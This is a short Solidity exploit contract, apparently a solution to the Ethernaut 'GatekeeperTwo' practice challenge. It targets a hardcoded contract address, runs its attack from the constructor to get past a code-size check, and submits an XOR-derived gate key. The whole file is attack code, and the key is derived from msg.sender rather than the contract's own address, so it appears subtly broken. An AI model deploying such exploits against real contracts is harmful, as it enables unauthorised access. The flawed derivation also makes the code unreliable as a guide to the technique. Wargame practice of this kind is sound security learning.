// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./contract.sol";

contract GatekeeperHack {
    GatekeeperTwo public original =
        GatekeeperTwo(0xb306573eBC69f62D4463e008b90BB7Ebb701f664);

    constructor() {
        hack();
    }

    function getValue() public view returns (bytes8) {
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                type(uint64).max
        );

        return key;
    }

    function hack() public {
        bytes8 gateKey = getValue();

        original.enter(gateKey);
    }
}
